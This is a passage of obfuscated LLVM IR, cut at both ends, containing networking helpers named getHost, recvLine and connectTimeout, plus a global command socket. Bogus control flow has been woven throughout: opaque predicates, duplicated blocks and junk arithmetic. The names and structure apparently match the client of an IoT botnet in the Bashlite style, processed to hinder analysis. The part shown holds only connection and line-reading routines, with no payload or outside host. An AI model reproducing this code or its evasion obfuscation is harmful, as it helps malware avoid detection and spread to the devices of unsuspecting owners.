  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br label %119

; <label>:119:                                    ; preds = %originalBBpart218
  %120 = load i32, i32* %3, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %3, align 4
  br label %71

; <label>:122:                                    ; preds = %originalBBpart24
  %123 = load i8*, i8** %2, align 8
  %124 = load i32, i32* %3, align 4
  %125 = load i32, i32* %4, align 4
  %126 = sub nsw i32 %124, %125
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %123, i64 %127
  store i8 0, i8* %128, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %29
  %129 = load i32, i32* %5, align 4
  %130 = load i32, i32* %4, align 4
  %131 = icmp sge i32 %129, %130
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  %132 = load i32, i32* %3, align 4
  %133 = load i32, i32* %5, align 4
  %134 = icmp sle i32 %132, %133
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %135 = load i8*, i8** %2, align 8
  %136 = load i32, i32* %3, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i8, i8* %138, align 1
  %140 = load i8*, i8** %2, align 8
  %141 = load i32, i32* %3, align 4
  %142 = load i32, i32* %4, align 4
  %_ = sub i32 0, %141
  %gen = add i32 %_, %142
  %_7 = shl i32 %141, %142
  %_8 = sub i32 0, %141
  %gen9 = add i32 %_8, %142
  %_10 = sub i32 0, %141
  %gen11 = add i32 %_10, %142
  %_12 = sub i32 0, %141
  %gen13 = add i32 %_12, %142
  %_14 = sub i32 0, %141
  %gen15 = add i32 %_14, %142
  %_16 = shl i32 %141, %142
  %143 = sub nsw i32 %141, %142
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %140, i64 %144
  store i8 %139, i8* %145, align 1
  br label %originalBB6
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.39
  %4 = load i32, i32* @y.40
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #3
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.39
  %21 = load i32, i32* @y.40
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %29

; <label>:28:                                     ; preds = %originalBBpart2
  store i32 1, i32* %11, align 4
  br label %30

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %28
  %31 = load i32, i32* @x.39
  %32 = load i32, i32* @y.40
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* %11, align 4
  %40 = load i32, i32* @x.39
  %41 = load i32, i32* @y.40
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %2
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca %struct.in_addr*, align 8
  %51 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %49, align 8
  store %struct.in_addr* %1, %struct.in_addr** %50, align 8
  %52 = load i8*, i8** %49, align 8
  %53 = call i32 @inet_addr(i8* %52) #3
  %54 = load %struct.in_addr*, %struct.in_addr** %50, align 8
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = icmp eq i32 %53, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %57 = load i32, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.41
  %5 = load i32, i32* @y.42
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.41
  %33 = load i32, i32* @y.42
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.41
  %42 = load i32, i32* @y.42
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %49, i64 0, i64 0
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %50) #3, !srcloc !1
  %52 = extractvalue { i64, i64* } %51, 0
  %53 = extractvalue { i64, i64* } %51, 1
  %54 = trunc i64 %52 to i32
  store i32 %54, i32* %18, align 4
  %55 = ptrtoint i64* %53 to i64
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %19, align 4
  %57 = load i32, i32* @x.41
  %58 = load i32, i32* @y.42
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* %13, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %71 = load i32, i32* %13, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %79, i32* %20, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %150

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* @x.41
  %83 = load i32, i32* @y.42
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %81
  %90 = load i32, i32* @x.41
  %91 = load i32, i32* @y.42
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %129, %originalBBpart28
  %99 = load i32, i32* %21, align 4
  %100 = icmp slt i32 %99, 10
  br i1 %100, label %101, label %149

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %102, align 8
  %103 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %103, align 8
  br label %104

; <label>:104:                                    ; preds = %101
  %105 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %105, i64 0, i64 0
  %107 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %106) #3, !srcloc !2
  %108 = extractvalue { i64, i64* } %107, 0
  %109 = extractvalue { i64, i64* } %107, 1
  %110 = trunc i64 %108 to i32
  store i32 %110, i32* %22, align 4
  %111 = ptrtoint i64* %109 to i64
  %112 = trunc i64 %111 to i32
  store i32 %112, i32* %23, align 4
  br label %113

; <label>:113:                                    ; preds = %104
  %114 = load i32, i32* %13, align 4
  %115 = srem i32 %114, 64
  %116 = zext i32 %115 to i64
  %117 = shl i64 1, %116
  %118 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %119 = load i32, i32* %13, align 4
  %120 = sdiv i32 %119, 64
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 %121
  %123 = load i64, i64* %122, align 8
  %124 = or i64 %123, %117
  store i64 %124, i64* %122, align 8
  %125 = load i32, i32* %13, align 4
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %127, i32* %20, align 4
  %128 = icmp sle i32 %127, 0
  br i1 %128, label %129, label %132

; <label>:129:                                    ; preds = %113
  %130 = load i32, i32* %21, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %21, align 4
  br label %98

; <label>:132:                                    ; preds = %113
  %133 = load i32, i32* @x.41
  %134 = load i32, i32* @y.42
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %132
  %141 = load i32, i32* @x.41
  %142 = load i32, i32* @y.42
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %149

; <label>:149:                                    ; preds = %originalBBpart212, %98
  br label %150

; <label>:150:                                    ; preds = %149, %65
  store i32 0, i32* %26, align 4
  %151 = load i8*, i8** %14, align 8
  store i8* %151, i8** %25, align 8
  br label %152

; <label>:152:                                    ; preds = %218, %150
  %153 = load i32, i32* @x.41
  %154 = load i32, i32* @y.42
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %152
  %161 = load i32, i32* %15, align 4
  %162 = add nsw i32 %161, -1
  store i32 %162, i32* %15, align 4
  %163 = icmp sgt i32 %161, 1
  %164 = load i32, i32* @x.41
  %165 = load i32, i32* @y.42
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart223, label %originalBB14alteredBB

originalBBpart223:                                ; preds = %originalBB14
  br i1 %163, label %172, label %221

; <label>:172:                                    ; preds = %originalBBpart223
  %173 = load i32, i32* @x.41
  %174 = load i32, i32* @y.42
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %172
  %181 = load i32, i32* @switchCommStock, align 4
  %182 = call i64 @recv(i32 %181, i8* %24, i64 1, i32 0)
  %183 = icmp ne i64 %182, 1
  %184 = load i32, i32* @x.41
  %185 = load i32, i32* @y.42
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %183, label %192, label %210

; <label>:192:                                    ; preds = %originalBBpart227
  %193 = load i32, i32* @x.41
  %194 = load i32, i32* @y.42
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %192
  %201 = load i8*, i8** %25, align 8
  store i8 0, i8* %201, align 1
  store i32 -1, i32* %12, align 4
  %202 = load i32, i32* @x.41
  %203 = load i32, i32* @y.42
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %240

; <label>:210:                                    ; preds = %originalBBpart227
  %211 = load i8, i8* %24, align 1
  %212 = load i8*, i8** %25, align 8
  %213 = getelementptr inbounds i8, i8* %212, i32 1
  store i8* %213, i8** %25, align 8
  store i8 %211, i8* %212, align 1
  %214 = load i8, i8* %24, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 10
  br i1 %216, label %217, label %218

; <label>:217:                                    ; preds = %210
  br label %221

; <label>:218:                                    ; preds = %210
  %219 = load i32, i32* %26, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %26, align 4
  br label %152

; <label>:221:                                    ; preds = %217, %originalBBpart223
  %222 = load i32, i32* @x.41
  %223 = load i32, i32* @y.42
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %221
  %230 = load i8*, i8** %25, align 8
  store i8 0, i8* %230, align 1
  %231 = load i32, i32* %26, align 4
  store i32 %231, i32* %12, align 4
  %232 = load i32, i32* @x.41
  %233 = load i32, i32* @y.42
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %240

; <label>:240:                                    ; preds = %originalBBpart235, %originalBBpart231
  %241 = load i32, i32* %12, align 4
  ret i32 %241

originalBBalteredBB:                              ; preds = %originalBB, %3
  %242 = alloca i32, align 4
  %243 = alloca i32, align 4
  %244 = alloca i8*, align 8
  %245 = alloca i32, align 4
  %246 = alloca %struct.fd_set, align 8
  %247 = alloca %struct.timeval, align 8
  %248 = alloca i32, align 4
  %249 = alloca i32, align 4
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i8, align 1
  %255 = alloca i8*, align 8
  %256 = alloca i32, align 4
  store i32 %0, i32* %243, align 4
  store i8* %1, i8** %244, align 8
  store i32 %2, i32* %245, align 4
  %257 = load i8*, i8** %244, align 8
  %258 = load i32, i32* %245, align 4
  %259 = sext i32 %258 to i64
  call void @llvm.memset.p0i8.i64(i8* %257, i8 0, i64 %259, i32 1, i1 false)
  %260 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 0
  store i64 30, i64* %260, align 8
  %261 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 1
  store i64 0, i64* %261, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %262 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %263 = getelementptr inbounds [16 x i64], [16 x i64]* %262, i64 0, i64 0
  %264 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %263) #3, !srcloc !1
  %265 = extractvalue { i64, i64* } %264, 0
  %266 = extractvalue { i64, i64* } %264, 1
  %267 = trunc i64 %265 to i32
  store i32 %267, i32* %18, align 4
  %268 = ptrtoint i64* %266 to i64
  %269 = trunc i64 %268 to i32
  store i32 %269, i32* %19, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %81
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %132
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %152
  %270 = load i32, i32* %15, align 4
  %_ = shl i32 %270, -1
  %_15 = shl i32 %270, -1
  %_16 = sub i32 %270, -1
  %gen = mul i32 %_16, -1
  %_17 = sub i32 %270, -1
  %gen18 = mul i32 %_17, -1
  %_19 = sub i32 0, %270
  %gen20 = add i32 %_19, -1
  %_21 = shl i32 %270, -1
  %271 = add nsw i32 %270, -1
  store i32 %271, i32* %15, align 4
  %272 = icmp sgt i32 %270, 1
  br label %originalBB14

originalBB25alteredBB:                            ; preds = %originalBB25, %172
  %273 = load i32, i32* @switchCommStock, align 4
  %274 = call i64 @recv(i32 %273, i8* %24, i64 1, i32 0)
  %275 = icmp ne i64 %274, 1
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %192
  %276 = load i8*, i8** %25, align 8
  store i8 0, i8* %276, align 1
  store i32 -1, i32* %12, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %221
  %277 = load i8*, i8** %25, align 8
  store i8 0, i8* %277, align 1
  %278 = load i32, i32* %26, align 4
  store i32 %278, i32* %12, align 4
  br label %originalBB33
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %180

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %137

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #3, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %103

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #3
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %180

; <label>:86:                                     ; preds = %79
  %87 = load i32, i32* @x.43
  %88 = load i32, i32* @y.44
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i32, i32* @x.43
  %96 = load i32, i32* @y.44
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %120

; <label>:103:                                    ; preds = %63
  %104 = load i32, i32* @x.43
  %105 = load i32, i32* @y.44
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %103
  store i32 0, i32* %5, align 4
  %112 = load i32, i32* @x.43
  %113 = load i32, i32* @y.44
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %180

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* @x.43
  %122 = load i32, i32* @y.44
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load i32, i32* @x.43
  %130 = load i32, i32* @y.44
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %154

; <label>:137:                                    ; preds = %45
  %138 = load i32, i32* @x.43
  %139 = load i32, i32* @y.44
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %137
  store i32 0, i32* %5, align 4
  %146 = load i32, i32* @x.43
  %147 = load i32, i32* @y.44
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
